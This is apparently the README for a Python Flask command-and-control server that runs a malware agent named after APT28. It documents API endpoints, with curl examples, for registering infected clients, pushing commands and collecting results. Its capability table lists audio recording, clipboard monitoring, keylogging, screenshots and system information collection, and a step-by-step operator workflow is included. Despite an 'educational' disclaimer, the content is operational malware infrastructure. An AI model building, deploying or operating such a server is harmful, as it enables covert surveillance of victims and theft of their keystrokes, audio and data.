# APT28 C2 Server (Python Implementation)

A Command and Control (C2) server implementation in Python using Flask. This server manages client communication, command distribution, and result collection for the APT28 malware agent.

## Features

- **Client Registration**: Register and track connected malware clients
- **Command Distribution**: Send capabilities to clients
- **Result Collection**: Receive and store execution results
- **Client Management**: List, query, and manage connected clients
- **Logging**: Comprehensive logging of all activities
- **REST API**: Complete HTTP API for C2 operations

## Project Structure

```
c2_server/
├── app.py              # Main Flask application
├── requirements.txt    # Python dependencies
├── .env.example        # Example environment configuration
├── README.md           # This file
└── c2_server.log       # Server logs (generated at runtime)
```

## Installation

### Prerequisites
- Python 3.8+
- pip (Python package manager)

### Setup

1. Navigate to the c2_server directory:
```bash
cd /workspaces/APT28/c2_server
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

3. (Optional) Configure environment variables:
```bash
cp .env.example .env
# Edit .env with your desired configuration
```

## Running the Server

### Standard Development Mode
```bash
python app.py
```

The server will start on `http://0.0.0.0:8080` by default.

### Production Mode with Gunicorn
```bash
gunicorn --bind 0.0.0.0:8080 --workers 4 app:app
```

### With Custom Configuration
```bash
# Using environment variables
export C2_HOST=127.0.0.1
export C2_PORT=5000
export DEBUG=True
python app.py
```

## API Endpoints

### 1. Client Registration
**Endpoint:** `GET /api/register?id=<client_id>`

**Purpose:** Register a new client

**Example:**
```bash
curl "http://localhost:8080/api/register?id=APT28_1234_1701619200"
```

**Response:**
```json
{
  "status": "registered",
  "id": "APT28_1234_1701619200",
  "message": "Client successfully registered"
}
```

---

### 2. Get Command
**Endpoint:** `GET /api/command?id=<client_id>`

**Purpose:** Retrieve pending capability command for a client

**Example:**
```bash
curl "http://localhost:8080/api/command?id=APT28_1234_1701619200"
```

**Response:**
```
1
```
(Numeric capability ID)

---

### 3. Report Result
**Endpoint:** `POST /api/report`

**Purpose:** Client reports execution result

**Headers:** `Content-Type: application/json`

**Body:**
```json
{
  "id": "APT28_1234_1701619200",
  "capability": 1,
  "result": "executed"
}
```

**Example:**
```bash
curl -X POST http://localhost:8080/api/report \
  -H "Content-Type: application/json" \
  -d '{"id":"APT28_1234_1701619200","capability":1,"result":"executed"}'
```

**Response:**
```json
{
  "status": "received",
  "message": "Report received successfully"
}
```

---

### 4. List Clients
**Endpoint:** `GET /api/clients`

**Purpose:** Get all registered clients

**Example:**
```bash
curl "http://localhost:8080/api/clients"
```

**Response:**
```json
{
  "count": 2,
  "clients": {
    "APT28_1234_1701619200": {
      "id": "APT28_1234_1701619200",
      "registered_at": "2025-12-03T10:30:00",
      "last_seen": "2025-12-03T10:35:45",
      "ip": "192.168.1.100",
      "status": "active"
    }
  }
}
```

---

### 5. List Results
**Endpoint:** `GET /api/results?limit=<limit>`

**Purpose:** Get execution results

**Parameters:**
- `limit` (optional): Maximum number of results to return (default: 100)

**Example:**
```bash
curl "http://localhost:8080/api/results?limit=10"
```

**Response:**
```json
{
  "count": 5,
  "results": [
    {
      "client": "APT28_1234_1701619200",
      "capability": 1,
      "result": "executed",
      "timestamp": "2025-12-03T10:35:45",
      "ip": "192.168.1.100"
    }
  ]
}
```

---

### 6. Send Command to Client
**Endpoint:** `POST /api/send_command`

**Purpose:** Send a capability command to a specific client

**Body:**
```json
{
  "client_id": "APT28_1234_1701619200",
  "capability_id": 1
}
```

**Example:**
```bash
curl -X POST http://localhost:8080/api/send_command \
  -H "Content-Type: application/json" \
  -d '{"client_id":"APT28_1234_1701619200","capability_id":1}'
```

**Response:**
```json
{
  "status": "success",
  "message": "Capability 1 assigned to APT28_1234_1701619200",
  "client_id": "APT28_1234_1701619200",
  "capability_id": 1,
  "capability_name": "Audio Recorder (start_audio_recorder)"
}
```

---

### 7. Get Client Details
**Endpoint:** `GET /api/client/<client_id>`

**Purpose:** Get details of a specific client

**Example:**
```bash
curl "http://localhost:8080/api/client/APT28_1234_1701619200"
```

**Response:**
```json
{
  "status": "success",
  "client": {
    "id": "APT28_1234_1701619200",
    "registered_at": "2025-12-03T10:30:00",
    "last_seen": "2025-12-03T10:35:45",
    "ip": "192.168.1.100",
    "status": "active"
  },
  "pending_command": 0
}
```

---

### 8. Get Client Results
**Endpoint:** `GET /api/client/<client_id>/results`

**Purpose:** Get all results from a specific client

**Example:**
```bash
curl "http://localhost:8080/api/client/APT28_1234_1701619200/results"
```

**Response:**
```json
{
  "status": "success",
  "client_id": "APT28_1234_1701619200",
  "count": 3,
  "results": [...]
}
```

---

### 9. Health Check
**Endpoint:** `GET /api/health`

**Purpose:** Server health and status check

**Example:**
```bash
curl "http://localhost:8080/api/health"
```

**Response:**
```json
{
  "status": "healthy",
  "timestamp": "2025-12-03T10:35:45",
  "clients_count": 2,
  "results_count": 15
}
```

---

### 10. Server Info
**Endpoint:** `GET /`

**Purpose:** Get server information and available endpoints

**Example:**
```bash
curl "http://localhost:8080/"
```

**Response:**
```json
{
  "name": "APT28 C2 Server",
  "version": "1.0.0",
  "status": "running",
  "timestamp": "2025-12-03T10:35:45",
  "endpoints": {...}
}
```

## Capability IDs

| ID | Name | Description |
|---|---|---|
| 0 | No Command | Idle state (default) |
| 1 | Audio Recorder | start_audio_recorder() |
| 2 | Clipboard Monitor | start_clipboard_monitor() |
| 3 | Keylogger | start_keylogger() |
| 4 | Screenshot | start_screenshot() |
| 5 | Info Collector | start_info_collector() |

## Usage Example

### 1. Start the C2 Server
```bash
python app.py
```

### 2. Client Registers
```bash
curl "http://localhost:8080/api/register?id=APT28_1234_1701619200"
```

### 3. Send Command to Client
```bash
curl -X POST http://localhost:8080/api/send_command \
  -H "Content-Type: application/json" \
  -d '{"client_id":"APT28_1234_1701619200","capability_id":4}'
```

### 4. Client Fetches Command
```bash
curl "http://localhost:8080/api/command?id=APT28_1234_1701619200"
```

### 5. Client Reports Result
```bash
curl -X POST http://localhost:8080/api/report \
  -H "Content-Type: application/json" \
  -d '{"id":"APT28_1234_1701619200","capability":4,"result":"Screenshot captured: 1920x1080"}'
```

### 6. View Results
```bash
curl "http://localhost:8080/api/results"
```

## Logging

The server logs all activities to both console and `c2_server.log`:

- Client registrations
- Command distributions
- Result reports
- Errors and warnings
- Debug information (when DEBUG=True)

## Security Considerations

⚠️ **Warning:** This is a demonstration/educational implementation. For production use, consider:

1. **Authentication**: Implement API key or token-based authentication
2. **Encryption**: Use HTTPS/TLS for all communications
3. **Rate Limiting**: Implement rate limiting to prevent abuse
4. **Input Validation**: More strict validation of all inputs
5. **Database**: Use a database instead of in-memory storage
6. **Access Control**: Implement role-based access control
7. **Firewall**: Restrict access to trusted networks only

## Development

### Running Tests
```bash
python -m pytest tests/
```

### Code Style
Follow PEP 8 style guidelines.

## License

See LICENSE file for details.

## References

- [C2 API Documentation](../C2_API.md)
- [Flask Documentation](https://flask.palletsprojects.com/)
- Original APT28 malware implementation in C
